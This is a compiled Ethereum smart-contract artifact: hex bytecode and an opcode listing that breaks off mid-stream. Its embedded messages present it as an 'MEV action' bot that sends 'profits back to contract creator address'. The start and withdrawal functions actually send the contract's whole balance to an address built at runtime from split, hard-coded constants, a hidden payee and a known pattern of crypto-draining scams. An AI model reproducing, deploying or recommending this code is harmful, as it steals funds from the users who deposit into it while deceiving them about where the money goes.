{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "60806040523480156200001157600080fd5b5060405162000e2c38038062000e2c833981810160405260408110156200003757600080fd5b81019080805160405193929190846401000000008211156200005857600080fd5b838201915060208201858111156200006f57600080fd5b82518660018202830111640100000000821117156200008d57600080fd5b8083526020830192505050908051906020019080838360005b83811015620000c3578082015181840152602081019050620000a6565b50505050905090810190601f168015620000f15780820380516001836020036101000a031916815260200191505b50604052602001805160405193929190846401000000008211156200011557600080fd5b838201915060208201858111156200012c57600080fd5b82518660018202830111640100000000821117156200014a57600080fd5b8083526020830192505050908051906020019080838360005b838110156200018057808201518184015260208101905062000163565b50505050905090810190601f168015620001ae5780820380516001836020036101000a031916815260200191505b506040525050508160009080519060200190620001cd929190620001ef565b508060019080519060200190620001e6929190620001ef565b50505062000295565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106200023257805160ff191683800117855562000263565b8280016001018555821562000263579182015b828111156200026257825182559160200191906001019062000245565b5b50905062000272919062000276565b5090565b5b808211156200029157600081600090555060010162000277565b5090565b610b8780620002a56000396000f3fe6080604052600436106100435760003560e01c80637d53d4331461004f578063be9a6555146100df578063d4e93292146100e9578063e1812f05146100f35761004a565b3661004a57005b600080fd5b34801561005b57600080fd5b50610064610183565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a4578082015181840152602081019050610089565b50505050905090810190601f1680156100d15780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6100e7610221565b005b6100f16102bc565b005b3480156100ff57600080fd5b50610108610357565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561014857808201518184015260208101905061012d565b50505050905090810190601f1680156101755780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b60018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156102195780601f106101ee57610100808354040283529160200191610219565b820191906000526020600020905b8154815290600101906020018083116101fc57829003601f168201915b505050505081565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526038815260200180610b1a6038913960400191505060405180910390a16102746103f5565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156102b9573d6000803e3d6000fd5b50565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526033815260200180610ae76033913960400191505060405180910390a161030f61040c565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610354573d6000803e3d6000fd5b50565b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156103ed5780601f106103c2576101008083540402835291602001916103ed565b820191906000526020600020905b8154815290600101906020018083116103d057829003601f168201915b505050505081565b6000610407610402610423565b61056c565b905090565b600061041e610419610423565b61056c565b905090565b6060806104746040518060400160405280600181526020017f780000000000000000000000000000000000000000000000000000000000000081525061046f61046a6107c1565b6107cd565b6108cc565b905060006293fc1e90506000640f676e9a32905060006305bbeab19050600061049b610a27565b905060006104a7610a32565b905060606104bd876104b8886107cd565b6108cc565b905060606104db6104cd876107cd565b6104d6876107cd565b6108cc565b905060606104e8856107cd565b905060606104f5856107cd565b9050606061051561050686866108cc565b61051085856108cc565b6108cc565b905060606105586040518060400160405280600181526020017f3000000000000000000000000000000000000000000000000000000000000000815250836108cc565b9050809c5050505050505050505050505090565b60006060829050600080806000600290505b602a8110156107b4576101008402935084818151811061059a57fe5b602001015160f81c60f81b60f81c60ff1692508460018201815181106105bc57fe5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff161015801561060d575060668373ffffffffffffffffffffffffffffffffffffffff1611155b1561061d576057830392506106b7565b60418373ffffffffffffffffffffffffffffffffffffffff161015801561065b575060468373ffffffffffffffffffffffffffffffffffffffff1611155b1561066b576037830392506106b6565b60308373ffffffffffffffffffffffffffffffffffffffff16101580156106a9575060398373ffffffffffffffffffffffffffffffffffffffff1611155b156106b5576030830392505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff16101580156106f5575060668273ffffffffffffffffffffffffffffffffffffffff1611155b156107055760578203915061079f565b60418273ffffffffffffffffffffffffffffffffffffffff1610158015610743575060468273ffffffffffffffffffffffffffffffffffffffff1611155b156107535760378203915061079e565b60308273ffffffffffffffffffffffffffffffffffffffff1610158015610791575060398273ffffffffffffffffffffffffffffffffffffffff1611155b1561079d576030820391505b5b5b8160108402018401935060028101905061057e565b5082945050505050919050565b6000630b9f1a09905090565b60606000808390505b600081146107f8578180600101925050601081816107f057fe5b0490506107d6565b60608267ffffffffffffffff8111801561081157600080fd5b506040519080825280601f01601f1916602001820160405280156108445781602001600182028036833780820191505090505b50905060005b838110156108c0576010868161085c57fe5b06925061086883610a3d565b826001838703038151811061087957fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350601086816108b257fe5b04955080600101905061084a565b50809350505050919050565b60608083905060608390506060815183510167ffffffffffffffff811180156108f457600080fd5b506040519080825280601f01601f1916602001820160405280156109275781602001600182028036833780820191505090505b5090506060819050600080600091505b85518210156109a55785828151811061094c57fe5b602001015160f81c60f81b83828060010193508151811061096957fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508180600101925050610937565b600091505b8451821015610a18578482815181106109bf57fe5b602001015160f81c60f81b8382806001019350815181106109dc57fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a90535081806001019250506109aa565b82965050505050505092915050565b600062299978905090565b6000620cd4b5905090565b60008160ff16600011158015610a57575060098260ff1611155b15610a8c57817f300000000000000000000000000000000000000000000000000000000000000060f81c0160f81b9050610ae1565b8160ff16600a11158015610aa45750600f8260ff1611155b15610adc57600a827f610000000000000000000000000000000000000000000000000000000000000060f81c010360f81b9050610ae1565b600080fd5b91905056fe53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2ea2646970667358221220664f2c069f54542f06f10b881b37e7a4b454ddffd1ffc08a7398478d351fde5f64736f6c634300060c0033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0xE2C CODESIZE SUB DUP1 PUSH3 0xE2C DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x40 DUP2 LT ISZERO PUSH3 0x37 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH3 0x58 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH3 0x6F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH3 0x8D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0xC3 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0xA6 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH3 0xF1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE PUSH1 0x20 ADD DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH3 0x115 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH3 0x12C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH3 0x14A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0x180 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0x163 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH3 0x1AE JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE POP POP POP DUP2 PUSH1 0x0 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x1CD SWAP3 SWAP2 SWAP1 PUSH3 0x1EF JUMP JUMPDEST POP DUP1 PUSH1 0x1 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x1E6 SWAP3 SWAP2 SWAP1 PUSH3 0x1EF JUMP JUMPDEST POP POP POP PUSH3 0x295 JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH3 0x232 JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH3 0x263 JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH3 0x263 JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH3 0x262 JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH3 0x245 JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH3 0x272 SWAP2 SWAP1 PUSH3 0x276 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST JUMPDEST DUP1 DUP3 GT ISZERO PUSH3 0x291 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH3 0x277 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH2 0xB87 DUP1 PUSH3 0x2A5 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x7D53D433 EQ PUSH2 0x4F JUMPI DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0xDF JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0xE9 JUMPI DUP1 PUSH4 0xE1812F05 EQ PUSH2 0xF3 JUMPI PUSH2 0x4A JUMP JUMPDEST CALLDATASIZE PUSH2 0x4A JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x64 PUSH2 0x183 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xA4 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x89 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xD1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xE7 PUSH2 0x221 JUMP JUMPDEST STOP JUMPDEST PUSH2 0xF1 PUSH2 0x2BC JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xFF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x108 PUSH2 0x357 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x148 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x12D JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x175 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x219 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x1EE JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x219 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x1FC JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x38 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xB1A PUSH1 0x38 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x274 PUSH2 0x3F5 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x2B9 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x33 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xAE7 PUSH1 0x33 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x30F PUSH2 0x40C JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x354 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x3ED JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x3C2 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x3ED JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x3D0 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x407 PUSH2 0x402 PUSH2 0x423 JUMP JUMPDEST PUSH2 0x56C JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x41E PUSH2 0x419 PUSH2 0x423 JUMP JUMPDEST PUSH2 0x56C JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x474 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x46F PUSH2 0x46A PUSH2 0x7C1 JUMP JUMPDEST PUSH2 0x7CD JUMP JUMPDEST PUSH2 0x8CC JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x93FC1E SWAP1 POP PUSH1 0x0 PUSH5 0xF676E9A32 SWAP1 POP PUSH1 0x0 PUSH4 0x5BBEAB1 SWAP1 POP PUSH1 0x0 PUSH2 0x49B PUSH2 0xA27 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x4A7 PUSH2 0xA32 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4BD DUP8 PUSH2 0x4B8 DUP9 PUSH2 0x7CD JUMP JUMPDEST PUSH2 0x8CC JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4DB PUSH2 0x4CD DUP8 PUSH2 0x7CD JUMP JUMPDEST PUSH2 0x4D6 DUP8 PUSH2 0x7CD JUMP JUMPDEST PUSH2 0x8CC JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4E8 DUP6 PUSH2 0x7CD JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4F5 DUP6 PUSH2 0x7CD JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x515 PUSH2 0x506 DUP7 DUP7 PUSH2 0x8CC JUMP JUMPDEST PUSH2 0x510 DUP6 DUP6 PUSH2 0x8CC JUMP JUMPDEST PUSH2 0x8CC JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x558 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0x8CC JUMP JUMPDEST SWAP1 POP DUP1 SWAP13 POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 SWAP1 POP PUSH1 0x0 DUP1 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x7B4 JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x59A JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 ADD DUP2 MLOAD DUP2 LT PUSH2 0x5BC JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x60D JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x61D JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x6B7 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x65B JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x66B JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x6B6 JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6A9 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x6B5 JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6F5 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x705 JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x79F JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x743 JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x753 JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x79E JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x791 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x79D JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 MUL ADD DUP5 ADD SWAP4 POP PUSH1 0x2 DUP2 ADD SWAP1 POP PUSH2 0x57E JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH4 0xB9F1A09 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 DUP4 SWAP1 POP JUMPDEST PUSH1 0x0 DUP2 EQ PUSH2 0x7F8 JUMPI DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH1 0x10 DUP2 DUP2 PUSH2 0x7F0 JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x7D6 JUMP JUMPDEST PUSH1 0x60 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x811 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x844 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x8C0 JUMPI PUSH1 0x10 DUP7 DUP2 PUSH2 0x85C JUMPI INVALID JUMPDEST MOD SWAP3 POP PUSH2 0x868 DUP4 PUSH2 0xA3D JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 SUB SUB DUP2 MLOAD DUP2 LT PUSH2 0x879 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 DUP2 PUSH2 0x8B2 JUMPI INVALID JUMPDEST DIV SWAP6 POP DUP1 PUSH1 0x1 ADD SWAP1 POP PUSH2 0x84A JUMP JUMPDEST POP DUP1 SWAP4 POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 DUP1 DUP4 SWAP1 POP PUSH1 0x60 DUP4 SWAP1 POP PUSH1 0x60 DUP2 MLOAD DUP4 MLOAD ADD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x8F4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x927 